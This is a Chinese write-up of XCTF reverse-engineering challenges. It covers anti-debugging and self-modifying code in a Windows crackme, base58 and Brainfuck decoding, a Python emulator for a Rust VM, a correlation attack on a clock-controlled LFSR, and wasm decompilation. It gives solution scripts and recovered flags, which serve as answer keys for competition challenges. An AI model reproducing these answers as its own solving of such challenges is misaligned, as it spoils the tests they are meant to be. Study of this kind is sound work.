# xctf战役_部分re题目


这次比赛做了四道简单的RE...难的师父做了嘻嘻,我好菜我好菜我好菜,Helica tql！    
## cycle graph    
主要记录一份图路径搜索算法的代码hh    
```python    
# 找到一条从start到end的路径    
def findPath(graph,start,end,path=[]):       
path = path + [start]    
if start == end:    
    return path     
for node in graph[start]:    
    if node not in path:    
        newpath = findPath(graph,node,end,path)    
        if newpath:    
            return newpath    
return None    
     
# 找到所有从start到end的路径    
def findAllPath(graph,start,end,path=[]):    
path = path +[start]    
if start == end:    
    return [path]    
     
paths = [] #存储所有路径        
for node in graph[start]:    
    if node not in path:    
        newpaths = findAllPath(graph,node,end,path)     
        for newpath in newpaths:    
            paths.append(newpath)    
return paths    
     
# 查找最短路径    
def findShortestPath(graph,start,end,path=[]):    
path = path +[start]    
if start == end:    
    return path    
    
shortestPath = []    
for node in graph[start]:    
    if node not in path:    
        newpath = findShortestPath(graph,node,end,path)    
        if newpath:    
            if not shortestPath or len(newpath)<len(shortestPath):    
                shortestPath = newpath    
return shortestPath    
     
'''    
主程序    
'''    
graph = {'A': ['B', 'C','D'],    
     'B': [ 'E'],    
     'C': ['D','F'],    
     'D': ['B','E','G'],    
     'E': [],    
     'F': ['D','G'],    
     'G': ['E']}    
     
onepath = findPath(graph,'A','G')    
print('一条路径:',onepath)    
     
allpath = findAllPath(graph,'A','G')    
print('\n所有路径：',allpath)    
     
shortpath = findShortestPath(graph,'A','G')    
print('\n最短路径：',shortpath)    
```

## 天津垓    
两个考点，第一个是反调试，第二个是smc      
反调试中一个是枚举窗口检测ida od等等，还有一个是判断STARTUPINFO信息      
题目有两个验证部分，第一个验证是代码中直接可见的，我用z3求解解出来了，第二个是需要经过smc后才可见的，我做题的时候并没有发现smc，用的持续单步然后dump出解密后的代码的方式。 不过这个smc函数并不在基本的流程里面，主要是使用了cygwin这个动态库，然后调用的，我查了一下cygwin这个动态库，主要是用来在windows平台上实现linux平台函数使用的，我后来调试的时候也是发现先进入cygwin.dll然后就到了smc函数的地方，我没太懂这个具体的原理==下面是smc的部分      
```cpp    
// sub_100401506(sub_10040164D, 0x415, Str);    
// 函数调用如上，主要用来修改sub_10040164D这个函数,修改的长度是0x415,Str是第一部分的输入    
BOOL __fastcall sub_100401506(void *a1, int a2, __int64 a3)    
{    
BOOL result; // eax    
DWORD flOldProtect; // [rsp+28h] [rbp-8h]    
int i; // [rsp+2Ch] [rbp-4h]    
LPVOID lpAddress; // [rsp+40h] [rbp+10h]    
int v7; // [rsp+48h] [rbp+18h]    
__int64 v8; // [rsp+50h] [rbp+20h]    
    
lpAddress = a1;    
v7 = a2;    
v8 = a3;    
if ( strlen(Str) != 18 )    
exit(1);    
if ( !VirtualProtect(lpAddress, v7, 0x40u, &flOldProtect) )  //将代码段的内存属性修改为可读写和执行    
exit(1);    
for ( i = 0; i < v7; ++i )    
*(lpAddress + i) ^= *(i % 18 + v8);    
result = VirtualProtect(lpAddress, v7, flOldProtect, &flOldProtect);  //修改后还原原来的内存属性    
if ( !result )    
exit(1);    
return result;    
}    
```
在 Windows 程序中使用了VirtualProtect()函数来改变虚拟内存区域的属性。函数声明如下:    
```cpp    
#include <Memoryapi.h>    
    
BOOL VirtualProtect(    
LPVOID lpAddress,    
SIZE_T dwSize,    
DWORD  flNewProtect,    
PDWORD lpflOldProtect    
);    
```
VirtualProtect()函数有4个参数，lpAddress是要改变属性的内存起始地址，dwSize是要改变属性的内存区域大小，flAllocationType是内存新的属性类型，lpflOldProtect内存原始属性类型保存地址。而flAllocationType部分值如下表。在 SMC 中常用的是 0x40。      
![](/images/ec0b4f683ce7597660d4da19e3cd65cc/11884068-0d587672ed95f2ba.jpg)    

这里smc就是一个简单的与第一部分的输入进行一个异或，使用idc脚本可以得到修改后的代码       
第二部分我还是用z3求解，但是因为乘数是素数也可以直接求逆元    

## fxck!    
这道题出的还挺那啥的,出题人一手替换文件把我坑惨了...题目最开始的验证部分写的有问题,但是我也有自己的问题,第一个就是不会base58(u1s1就算不知道base58我就连16进制转58进制都没看出来...活该我菜)第二个就是不会brainfuck,我以为是个虚拟机分析了好久,虽然分析出来加密的过程了但是用时太长了...记录一下这两个      
### 加密部分    
加密部分就是个base58,典型特征就是转58(0x3a)进制,还有查表操作,反编译的代码如下    
```cpp    
for ( i = 0; i < v10; ++i ) //进制转换    
{    
v14 = *(char *)(i + v11);    
for ( j = 0; j < v12; ++j )    
{    
  v14 += *((unsigned __int8 *)v20 + j) << 8;    
  *((_BYTE *)v20 + j) = v14 % 0x3A;    
  v14 /= 0x3Au;    
}    
while ( v14 )    
{    
  v4 = v12++;    
  *((_BYTE *)v20 + v4) = v14 % 0x3A;    
  v14 /= 0x3Au;    
}    
}    
v5 = std::operator<<<std::char_traits<char>>(&std::cout, "WAIT WAIT WAIT!");    
std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);    
v16 = 0;    
while ( v16 < v10 && !*(_BYTE *)(v16 + v11) )    
{    
v6 = v16++;    
*(_BYTE *)(v6 + v9) = 49;    
}    
for ( k = 0; k <= 57; ++k )    
byte_602500[k] ^= byte_602490[k % 7] ^ (unsigned __int8)k;    
for ( l = 0; l < v12; ++l ) //查表操作    
*(_BYTE *)(v16 + l + v9) = byte_602500[*((unsigned __int8 *)v20 + v12 - 1 - l)];    
```
### 验证部分    
验证部分是一个brainfuck语言的解释器，这种语言基于一个简单的机器模型，除了指令，这个机器还包括：一个以字节为单位、被初始化为零的数组、一个指向该数组的指针（初始时指向数组的第一个字节）、以及用于输入输出的两个字节流。关于这个语言的介绍:      
[Brainfuck](https://zh.wikipedia.org/wiki/Brainfuck)      
[Brainfuck在线解析器](https://www.nayuki.io/page/brainfuck-interpreter-javascript)      
这个语言一共只包含如下8个状态      
![](/images/ec0b4f683ce7597660d4da19e3cd65cc/11884068-8a8a6b1f410bc20b.png)    

典型特征是代码中包含指针的加减以及指针指向值的加减      
```cpp    
while ( v5 < i )    
{    
v2 = (unsigned __int8)byte_6020A0[v5];    
if ( v2 == 0xC4 )    
{    
  ++*v9; //+    
}    
else if ( v2 > 196 )    
{    
  switch ( v2 )    
  {    
    case 0xDD: //[    
      if ( !*v9 )    
        v5 = dword_603B20[v5];    
      break;    
    case 0xFD: //]    
      v5 = dword_603B20[v5] - 1;    
      break;    
    case 0xC5:    
      --*v9;  //-    
      break;    
  }    
}    
else    
{    
  switch ( v2 )    
  {    
    case 0xA8:    
      ++v9; //>    
      break;    
    case 0xA9:    
      --v9; //<    
      break;    
    case 1: //.    
      v3 = v7++;    
      s1[v3] = *v9;    
      break;    
  }    
}    
++v5;    
}    
```
提取byte_6020A0中的指令，使用下面的解释器可以对brainfuck反编译      
```python    
import re    
    
def sym2cal(s):    
if '>' in s:    
    return len(s)    
else:    
    return -len(s)    
    
def cal(s):    
if '+' in s:    
    return '+= %d'%len(s)    
else:    
    return '-= %d'%len(s)    
    
def bf2asm(s,ptr,tab):    
p = 0    
l = len(s)    
while(p<l):    
    pattern = re.compile(r'([><]*)\[-([><]*)\[-\]([><]+)\[-\]([><]+)\[-([><]+)\+([><]+)\+([><]+)\]([><]+)\[-([><]+)\+([><]+)\]([><]*)\[-([><]+)\+([><]+)\]([><]*)\]')    
    match = pattern.match(s[p:])    
    if match:            
        p += len(match.group())    
    
        groups = match.groups()    
        ptr1 = ptr + sym2cal(groups[0])    
        ptr2 = ptr1    
        for i in xrange(1,4):    
            ptr2 += sym2cal(groups[i])    
        ptr3 = ptr2    
        for i in xrange(4,12):    
            ptr3 += sym2cal(groups[i])    
        print tab+'mem[%d] += mem[%d]*mem[%d]'%(ptr3,ptr2,ptr1)    
    
        for v in groups:    
            ptr += sym2cal(v)    
        continue    
        
    pattern = re.compile(r'([><]*)\[-\]([><]+)\[-\]([><]+)\[-([><]+)\+([><]+)\+([><]+)\]([><]+)\[-([><]+)\+([><]+)\]([><]*)\[-([><]+)\+([><]+)\]')    
    match = pattern.match(s[p:])    
    if match:    
        p += len(match.group())    
    
        groups = match.groups()    
        ptr1 = ptr    
        for i in xrange(3):    
            ptr1 += sym2cal(groups[i])    
        ptr2 = ptr1    
        for i in xrange(3,11):    
            ptr2 += sym2cal(groups[i])    
        print tab+'mem[%d] += mem[%d]'%(ptr2,ptr1)    
    
        for v in groups:    
            ptr += sym2cal(v)    
        continue    
    
    pattern = re.compile(r'([><]*)\[-\]([><]+)\[-\]([><]+)\[-([><]+)\+([><]+)\+([><]+)\]([><]+)\[-([><]+)\+([><]+)\]([><]+)')    
    match = pattern.match(s[p:])    
    if match:    
        p += len(match.group())    
    
        groups = match.groups()    
        ptr1 = ptr + sym2cal(groups[0])    
        ptr2 = ptr1 + sym2cal(groups[1])    
        ptr3 = ptr2 + sym2cal(groups[2])    
        print tab+'mem[%d] = mem[%d]'%(ptr1,ptr3)    
    
        for v in groups:    
            ptr += sym2cal(v)    
        continue    
            
    pattern = re.compile(r'\[-\]')    
    match = pattern.match(s[p:])    
    if match:    
        p += len(match.group())    
        print tab+'mem[%d] = 0'%(ptr)    
        continue    
    
    pattern = re.compile(r'>+')    
    match = pattern.match(s[p:])    
    if match:    
        p += len(match.group())    
        ptr += len(match.group())    
        continue    
    
    pattern = re.compile(r'<+')    
    match = pattern.match(s[p:])    
    if match:    
        p += len(match.group())    
        ptr -= len(match.group())    
        continue    
    
    pattern = re.compile(r'\++')    
    match = pattern.match(s[p:])    
    if match:    
        p += len(match.group())    
        print tab+'mem[%d] %s'%(ptr,cal(match.group()))    
        continue    
    
    pattern = re.compile(r'-+')    
    match = pattern.match(s[p:])    
    if match:    
        p += len(match.group())    
        print tab+'mem[%d] %s'%(ptr,cal(match.group()))    
        continue    
    
    c = s[p]    
    if c == '[':    
        stk = 1    
        for i,v in enumerate(s[p+1:]):    
            if v == '[':    
                stk += 1    
            elif v == ']':    
                stk -= 1    
            else:    
                continue    
            if stk == 0:    
                print tab+'while mem[%d]:'%ptr    
                ptr = bf2asm(s[p+1:p+1+i],ptr,tab+'\t')    
                p += i+1    
                break    
        continue    
    
    elif c == ',':    
        if input_ptr < 96:    
            print tab+'mov mem[%d] input[input_ptr]'%ptr    
        else:    
            if bit_add >= 3600:    
                print tab+'mov mem[%d] 0x30'%ptr    
            else:    
                print tab+'mov mem[%d] 1'%ptr    
    elif c == '.':    
        print tab+'cmp mem[%d] data[data_ptr]'%ptr    
    p += 1    
return ptr    
    
s = ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]<<<<<<<<<<<<<<<<<<<<<<<[-]>>>>>>>>>>>>>>>>>>>>>>[->+<<<<<<<<<<<<<<<<<<<<<<<+>>>>>>>>>>>>>>>>>>>>>>]<<<<<<<<<<<<<<<<<<<<<<[->>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<]>>>>>>>>>>>>>>>>>>>>>>,>>>>>>[-]<<<<<<<<<<<<<<<<<<<<<<<<<<<<[-]>>>>>>>>>>>>>>>>>>>>>>[->>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<+>>>>>>>>>>>>>>>>>>>>>>]"    
input_ptr = 0    
bit_add = 0    
bf2asm(s,0,'')    
```
## easyparser    
这道题是做出来让我最高兴的一道题(xiaoku.jpg)主要是查了一下发现用了Rust,Rust代码里面会多了很多安全检查的部分来扰乱一下视线(比如说做加法之前会检查加法会不会溢出),去掉这些安全检查的部分之后倒是挺容易看出来解释器的逻辑,之后就是体力活了==      
wp里面有句话记录一下，或许以后出题用得着呢嘻嘻    
>一个vm逆向题目，在.init_array中初始化了一部分数据，在.fin_array中进行flag的检查，由于Rust编程    
规范不允许在main前和main后编写逻辑，所以先用Rust写了一个so库，用c语言进行一次包裹    

逆出来以后可以看出来流程，第一层用来检查输入长度等于38，第二层将输入的中间部分，左移2后与99异或等于特定值.下面是反编译的代码      
```python    
data = [0, 0, 18, 1, 1, 18, 2, 2, 18, 3, 3, 18, 6, 6, 18, 7, 7, 18, 0, 105, 1, 1, 110, 1, 2, 112, 1, 3, 117, 1, 6, 116, 1, 7, 32, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 102, 1, 1, 108, 1, 2, 97, 1, 3, 103, 1, 6, 58, 1, 7, 32, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 1, 1, 18, 0, 0, 23, 0, 0, 5, 1, 1, 7, 1, 38, 26, 31, 0, 30, 0, 0, 25, 0, 0, 6, 0, 125, 26, 18, 0, 28, 0, 98, 1, 1, 121, 1, 2, 101, 1, 3, 126, 1, 6, 126, 1, 7, 126, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 10, 1, 0, 0, 24, 0, 0, 25, 8, 256, 1, 8, 225, 26, 25, 0, 30, 0, 0, 6, 8, 0, 4, 8, 1, 9, 19, 0, 29, 0, 0, 6, 0, 123, 26, 3, 0, 31, 0, 0, 6, 0, 103, 26, 3, 0, 31, 0, 0, 6, 0, 97, 26, 3, 0, 31, 0, 0, 6, 0, 108, 26, 3, 0, 31, 0, 0, 6, 0, 102, 26, 3, 0, 31, 9, 9, 18, 10, 225, 1, 7, 9, 3, 6, 10, 3, 6, 99, 17, 6, 2, 13, 6, 7, 27, 3, 0, 31, 9, 1, 7, 10, 1, 7, 9, 32, 26, 42, 0, 30, 0, 99, 1, 1, 111, 1, 2, 114, 1, 3, 114, 1, 6, 101, 1, 7, 99, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24]    
qword_6C09B8 = [144, 332, 28, 240, 132, 60, 24, 64, 64, 240, 208, 88, 44, 8, 52, 240, 276, 240, 128, 44, 40, 52, 8, 240, 144, 68, 48, 80, 92, 44, 264, 240] + [0]*1248    
qword_6BF1B8 = [0] * 768    
EIP = 0x1f    
qword_6BF130 = [0x66, 0, 0x61, 0x67] + [0]*100    
qword_6BF150 = 0x100    
flag = "flag{G0ertyuiopasdfghjklzxcvbnmoooouu}"    
index = 0    
while True:    
opcode = data[EIP * 3 + 2]    
arg1 = data[EIP * 3]    
arg2 = data[EIP * 3 + 1]    
EIP = EIP + 1    
if opcode == 25:    
    print "exit",25    
    # print qword_6BF1B8    
    if index == 38:    
        data = [0, 0, 6, 0, 125, 26, 18, 0, 28, 0, 98, 1, 1, 121, 1, 2, 101, 1, 3, 126, 1, 6, 126, 1, 7, 126, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 10, 1, 0, 0, 24, 0, 0, 25, 8, 256, 1, 8, 225, 26, 25, 0, 30, 0, 0, 6, 8, 0, 4, 8, 1, 9, 19, 0, 29, 0, 0, 6, 0, 123, 26, 3, 0, 31, 0, 0, 6, 0, 103, 26, 3, 0, 31, 0, 0, 6, 0, 97, 26, 3, 0, 31, 0, 0, 6, 0, 108, 26, 3, 0, 31, 0, 0, 6, 0, 102, 26, 3, 0, 31, 9, 9, 18, 10, 225, 1, 7, 9, 3, 6, 10, 3, 6, 99, 17, 6, 2, 13, 6, 7, 27, 3, 0, 31, 9, 1, 7, 10, 1, 7, 9, 32, 26, 42, 0, 30, 0, 99, 1, 1, 111, 1, 2, 114, 1, 3, 114, 1, 6, 101, 1, 7, 99, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 116, 1, 1, 108, 1, 2, 121, 1, 3, 33, 1, 6, 10, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 0, 0, 25]    
        EIP = 0    
        index = 0    
    else:    
        break    
elif opcode == 0:    
    v31 = qword_6BF130[arg1]    
    qword_6C09B8[v31] = arg2    
    print "v31 = qword_6BF130[",arg1,"]"    
    print "qword_6C09B8[",v31,"] = ",arg2    
elif opcode == 1:            
    print "qword_6BF130[",arg1,"] = ",arg2    
    qword_6BF130[arg1] = arg2    
elif opcode == 2:    
    qword_6BF130[arg1] = qword_6BF130[arg2]    
    print "qword_6BF130[",arg1,"] = qword_6BF130[",arg2,"];"    
elif opcode == 3:    
    v29 = qword_6BF130[arg2]    
    qword_6BF130[arg1] = qword_6C09B8[v29]    
    print "v29 = qword_6BF130[",arg2,"]"    
    print "qword_6BF130[",arg1,"] = qword_6C09B8[",v29,"]"    
elif opcode == 4:    
    v30 = qword_6BF130[arg1]    
    qword_6C09B8[v30] = qword_6BF130[arg2]    
    print "v30 = qword_6BF130[",arg1,"]"    
    print "qword_6C09B8[",v30,"] = qword_6BF130[",arg2,"]"    
elif opcode == 5:    
    qword_6BF150 += 1    
    qword_6BF1B8[qword_6BF150] = qword_6BF130[arg1]    
    print "qword_6BF150 = qword_6BF150 + 1"    
    print "qword_6BF1B8[",qword_6BF150,"] = qword_6BF130[",arg1,"]"    
elif opcode == 6:    
    qword_6BF130[arg1] = qword_6BF1B8[qword_6BF150]    
    qword_6BF150 = qword_6BF150 - 1    
    print "qword_6BF130[",arg1,"] = qword_6BF1B8[",qword_6BF150,"]"    
    print "qword_6BF150 = qword_6BF150 - 1"    
elif opcode == 7:    
    qword_6BF130[arg1] += arg2    
    print "qword_6BF130[",arg1,"] += ",arg2    
elif opcode == 8:    
    v28 = qword_6BF130[arg2]    
    qword_6BF130[arg1] += v28    
    print "v28 = qword_6BF130[",arg2,"]"    
    print "qword_6BF130[",arg1,"] += ",v28    
elif opcode == 9:    
    v3 = qword_6BF130[arg1]    
    qword_6BF130[arg1] = v3 - arg2    
    print "v3 = qword_6BF130[",arg1,"]"    
    print "qword_6BF130[",arg1,"] = ",v3,"-", arg2    
elif opcode == 10:    
    v27 = qword_6BF130[arg2]    
    v4 = qword_6BF130[arg1]    
    qword_6BF130[arg1] = v4 - v27    
    print "v27 = qword_6BF130[",arg2,"]"    
    print "v4 = qword_6BF130[",arg1,"]"    
    print "qword_6BF130[",arg1,"] = ",v4 ,"-",v27    
elif opcode == 11:    
    qword_6BF130[arg1] *= arg2    
    print "qword_6BF130[",arg1,"] *= ",arg2    
elif opcode == 12:    
    v26 = qword_6BF130[arg2]    
    qword_6BF130[arg1] *= v26    
    print "v26 = qword_6BF130[",arg2,"]"    
    print "qword_6BF130[",arg1,"] *= ",v26    
elif opcode == 13:    
    qword_6BF130[arg1] <<= arg2 & 0x3F    
    print "qword_6BF130[",arg1,"] <<= ",arg2,"& 0x3F"    
elif opcode == 14:    
    v25 = qword_6BF130[arg2]    
    qword_6BF130[arg1] <<= v25 & 0x3F    
    print "v25 = qword_6BF130[",arg2,"]"    
    print "qword_6BF130[",arg1,"] <<= ",v25 ,"& 0x3F"    
elif opcode == 15:    
    qword_6BF130[arg1] >>= arg2 & 0x3F    
    print "qword_6BF130[",arg1,"] >>= ",arg2 ,"& 0x3F"    
elif opcode == 16:    
    v24 = qword_6BF130[arg2]    
    qword_6BF130[arg1] >>= v24 & 0x3F    
    print "v24 = qword_6BF130[",arg2,"]"    
    print "qword_6BF130[",arg1,"] >>= ",v24 ,"& 0x3F"    
elif opcode == 17:    
    qword_6BF130[arg1] ^= arg2    
    print "qword_6BF130[",arg1,"] ^= ",arg2    
elif opcode == 18:    
    qword_6BF130[arg1] ^= qword_6BF130[arg2]    
    print "qword_6BF130[",arg1,"] ^= qword_6BF130[",arg2,"]"    
elif opcode == 19:    
    qword_6BF130[arg1] |= arg2    
    print "qword_6BF130[",arg1,"] |= ",arg2    
elif opcode == 20:    
    qword_6BF130[arg1] |= qword_6BF130[arg2]    
    print "qword_6BF130[",arg1,"] |= qword_6BF130[",arg2,"]"    
elif opcode == 21:    
    qword_6BF130[arg1] &= arg2    
    print "qword_6BF130[",arg1,"] &= ",arg2    
elif opcode == 22:    
    qword_6BF130[arg1] &= qword_6BF130[arg2]    
    print "qword_6BF130[",arg1,"] &= qword_6BF130[",arg2,"]"    
elif opcode == 23:    
    qword_6BF130[arg1] = ord(flag[index])    
    index = index + 1    
    print "qword_6BF130[",arg1,"] =", flag[index - 1]    
    # if flag == 32:    
    #     print "get another one"    
    #     break    
    # flag = True    
elif opcode == 24:    
    v13 = qword_6BF130[arg1]    
    print "v13 = qword_6BF130[",arg1,"]"    
elif opcode == 26:    
    byte_6BF1B0 = qword_6BF130[arg1] == arg2    
    byte_6BF1B1 = qword_6BF130[arg1] < arg2    
    print "byte_6BF1B0 = qword_6BF130[",arg1,"] == ",arg2    
    print "byte_6BF1B1 = qword_6BF130[",arg1,"] < ",arg2    
elif opcode == 27:    
    byte_6BF1B0 = qword_6BF130[arg1] == qword_6BF130[arg2]    
    byte_6BF1B1 = qword_6BF130[arg1] < qword_6BF130[arg2]    
    print "byte_6BF1B0 = qword_6BF130[",arg1,"] == qword_6BF130[",arg2,"]"    
    print "byte_6BF1B1 = qword_6BF130[",arg1,"] < qword_6BF130[",arg2,"]"    
    print "==>",qword_6BF130[arg1], qword_6BF130[arg2]    
elif opcode == 28:    
    if byte_6BF1B0 == 1:    
        EIP = arg1    
    print "if byte_6BF1B0 == 1: EIP = ",arg1    
elif opcode == 29:    
    EIP = arg1    
    print " EIP = ",arg1    
elif opcode == 30:    
    if byte_6BF1B1 == 1:    
        EIP = arg1    
    print "if ( byte_6BF1B1 == 1 )EIP = ",arg1    
elif opcode == 31:    
    if not byte_6BF1B0:    
        EIP = arg1    
    print "if ( !byte_6BF1B0 )EIP = ",arg1    
else:    
    print "Unkown opcode",opcode    
    break    
```

## clock    
从这里开始都是我不会的题==      
这个题的加密流程很容易能看出来,但是我不会解...后来师父来了很快就做出来了略(Helica好厉害好厉害我好菜我好菜),wp中说是穷举钟控的寄存器初态，对另外两个寄存器快速相关攻击。      
程序实现了一个时钟控制的非线性移位寄存器，由一个lfsr控制另外两个lfsr的输出。    
```python    
x = n1 ? n3 : n2    
```
用相关性攻击，先分析输出与三个lfsr的关系，可知输出与n2和n3相同的概率是0.75，和n1相同的概率是0.5。先分别爆破猜出n2和n3，之后再爆破推出n1。      
```python    
def lfsr_1(R, mask):    
output = (R << 1) & 0x1fffff    
i = (R & mask) & 0x1fffff    
lastbit = 0    
while i != 0:    
    lastbit ^= (i & 1)    
    i = i >> 1    
output ^= lastbit    
return (output, lastbit)    
    
def lfsr_2(R, mask):    
output = (R << 1) & 0x3fffff    
i = (R & mask) & 0x3fffff    
lastbit = 0    
while i != 0:    
    lastbit ^= (i & 1)    
    i = i >> 1    
output ^= lastbit    
return (output, lastbit)    
    
def lfsr_3(R, mask):    
output = (R << 1) & 0x7fffff    
i = (R & mask) & 0x7fffff    
lastbit = 0    
while i != 0:    
    lastbit ^= (i & 1)    
    i = i >> 1    
output ^= lastbit    
return (output, lastbit)    
    
def single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask):    
(R1_NEW, x1) = lfsr_1(R1, R1_mask)    
(R2_NEW, x2) = lfsr_2(R2, R2_mask)    
(R3_NEW, x3) = lfsr_3(R3, R3_mask)    
    
return (R1_NEW, R2_NEW, R3_NEW, x3 if x1 == 1 else x2)    
    
    
R1_mask = 0x17FA06    
R2_mask = 0x2A9A0D    
R3_mask = 0x5E5E6A    
n3 = 23    
n2 = 22    
n1 = 21    
    
def guess_2(beg, end, num, mask):    
ansn = range(beg, end)    
data = open('./output').read(num)    
data = ''.join(bin(256 + ord(c))[3:] for c in data)    
now = 0    
res = 0    
for i in ansn:    
    r = i    
    cnt = 0    
    for j in range(num * 8):    
        r, lastbit = lfsr_2(r, mask)    
        lastbit = str(lastbit)    
        cnt += (lastbit == data[j])    
    if cnt > now:    
        now = cnt    
        res = i    
        print now, res,    
        print 'cor rate: %f' % (cnt*1.0 / (num*8))    
return res    
    
def guess_3(beg, end, num, mask):    
ansn = range(beg, end)    
data = open('./output').read(num)    
data = ''.join(bin(256 + ord(c))[3:] for c in data)    
now = 0    
res = 0    
for i in ansn:    
    r = i    
    cnt = 0    
    for j in range(num * 8):    
        r, lastbit = lfsr_3(r, mask)    
        lastbit = str(lastbit)    
        cnt += (lastbit == data[j])    
    if cnt > now:    
        now = cnt    
        res = i    
        print now, res,     
        print 'cor rate: %f' % (cnt*1.0 / (num*8))    
return res    
    
    
def bruteforce1(y, z):    
data = open('./output').read(50)    
data = ''.join(bin(256 + ord(c))[3:] for c in data)    
for x in range(pow(2, n1 - 1), pow(2, n1)):    
    R1, R2, R3 = x, y, z    
    flag = True    
    for i in range(len(data)):    
        (R1, R2, R3,    
         out) = single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask)    
        if str(out) != data[i]:    
            flag = False    
            break    
    if y % 10000 == 0:    
        print 'now: ', x, y, z    
    if flag:    
        print 'ans: ', hex(x)[2:], hex(y)[2:], hex(z)[2:]    
        break    
    
    
#R2 = guess_2(pow(2, n2 - 1), pow(2, n2), 50, R2_mask)    
R2 = 3324079    
print R2    
#R3 = guess_3(pow(2, n3 - 1), pow(2, n3), 50, R3_mask)    
R3 = 4958299    
print R3    
    
bruteforce1(R2, R3)    
```
X1cT34m给了一个c版本的,应该要快很多,记录一下    
```c    
#include <stdio.h>    
#include <stdint.h>    
    
void lfsr(    
int init, int mask1, int mask2, uint8_t* seq, int len    
) {    
for(int j = 0; j < len; j++) {    
    uint8_t byte = 0;    
    uint8_t bit = 8;    
    do {    
        uint8_t output = 0;    
        int x = init & mask1;    
        while (x) {    
            output ^= x & 1;    
            x >>= 1;    
        }    
        init = (output ^ (init << 1)) & mask2;    
        byte = (byte << 1) ^ output;    
        bit--;    
    } while (bit);    
    seq[j] = byte;    
}    
}    
    
double correlation(    
uint8_t* A, uint8_t* B, int len    
) {    
int N = len * 8;    
int d = 0;    
for(int i = 0; i < len; i++) {    
    uint8_t bit = 8;    
    uint8_t a = A[i];    
    uint8_t b = B[i];    
    do {    
        if ((a & 1) == (b & 1))    
            d++;    
        a >>= 1;    
        b >>= 1;    
        bit--;    
    } while (bit);    
}    
return (double)d / N;    
}    
    
uint8_t mixed_output[] = {    
95, 83, 107, 255, 209, 96, 188, 166, 230, 219, 223, 72, 150, 155, 169,    
138, 126, 0, 91, 20, 19, 109, 82, 12, 249, 91, 39, 107, 104, 55, 207,    
65, 155, 197, 204, 81, 76, 22, 83, 208, 215, 13, 254, 14, 43, 87, 29,    
42, 161, 92, 2, 109, 110, 232, 201, 147, 19, 53, 216, 82, 144, 169,    
34, 193, 106, 0, 253, 224, 7, 46, 24, 16, 226, 127, 164, 162, 54, 98,    
144, 141, 182, 174, 252, 64, 130, 19, 163, 242, 176, 78, 79, 3, 19, 11,    
160, 121, 149, 44, 53, 17,    
}; // 100    
    
void guess2(    
) {    
int len = 100;    
uint8_t seq[100] = {};    
    
int possible_r2 = 0;    
double max_p = 0.0;    
    
int r2;    
for (r2 = 0; r2 < (1<<22); r2++) {    
    lfsr(r2, 0x2A9A0D, 0x3FFFFF, seq, 100);    
    
    double corr = correlation(seq, mixed_output, len);    
    if (corr > max_p) {    
        possible_r2 = r2;    
        max_p = corr;    
    }    
}    
printf("%d %f", possible_r2, max_p); // 3324079    
}    
    
void guess3(    
) {    
int len = 100;    
uint8_t seq[100] = {};    
    
int possible_r3 = 0;    
double max_p = 0.0;    
    
int r3;    
for (r3 = 0; r3 < (1<<23); r3++) {    
    lfsr(r3, 0x5E5E6A, 0x7FFFFF, seq, 100);    
    
    double corr = correlation(seq, mixed_output, len);    
    if (corr > max_p) {    
        possible_r3 = r3;    
        max_p = corr;    
    }    
}    
printf("%d %f", possible_r3, max_p); // 4958299    
}    
    
void brute_force(    
) {    
uint8_t seq_r1[100] = {};    
uint8_t seq_r2[100] = {};    
uint8_t seq_r3[100] = {};    
    
int r2 = 3324079;    
int r3 = 4958299;    
    
lfsr(r2, 0x2A9A0D, 0x3FFFFF, seq_r2, 100);    
lfsr(r3, 0x5E5E6A, 0x7FFFFF, seq_r3, 100);    
    
for(int r1 = 1427994; r1 < (1<<21); r1++) {    
    lfsr(r1, 0x17FA06, 0x1FFFFF, seq_r1, 100);    
    
    for (int i = 0; i < 100; i++) {    
        int byte = 0;    
    
        for(int bit = 7; bit >= 0; bit--) {    
            int x1 = (seq_r1[i]>>bit) & 1;    
            int x2 = (seq_r2[i]>>bit) & 1;    
            int x3 = (seq_r3[i]>>bit) & 1;    
            byte = (byte<<1) ^ ((x1*x3)^((x1^1)*x2));    
        }    
    
        if (byte != mixed_output[i]) break;    
        if (i == 99) printf("%d", r1);  // 1427994    
    }    
}    
}    
    
int main(    
) {    
// guess2();    
// guess3();    
// brute_force();    
    
int r1 = 1427994;    
int r2 = 3324079;    
int r3 = 4958299;    
printf("%x%x%x", r1, r2, r3); // flag{15ca1a32b8af4ba85b}    
}    
```
关于LFSR的一些资料      
[线性反馈移位寄存器与梅森旋转算法](https://blog.csdn.net/ACdreamers/article/details/44656743)      
[深入分析CTF中的LFSR类题目(一)](https://www.anquanke.com/post/id/181811)      
[深入分析CTF中的LFSR类题目(二)](https://www.anquanke.com/post/id/184828)      

## baby_wasi    
趁着这道题好好学习了一下wasm,感觉收获还挺多的(Helica tql tql tql)      
### 反编译wasm    
这道题用了wasmer-c-api来构建,主程序为baby_wasi,program.wasm为子程序,主要处理字符串变换逻辑.首先对program.wasm逆向分析.基础教程:      
[一种Wasm逆向静态分析方法](https://xz.aliyun.com/t/5170)      
反汇编的话，可以用`wasm2wat`把wasm反汇编成wat，https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format 这里面对wat进行了一些解释      
还可以把wasm转成c语言的格式，用`wasm2c`    
```shell    
$ ./wasm2c wasm.wasm -o wasm.c    
==> 得到wasm.c和wasm.h    
```
但是因为生成的c语言很长而且基本跟看wat没什么区别，所以需要再编译成二进制文件放到ida里面去看      
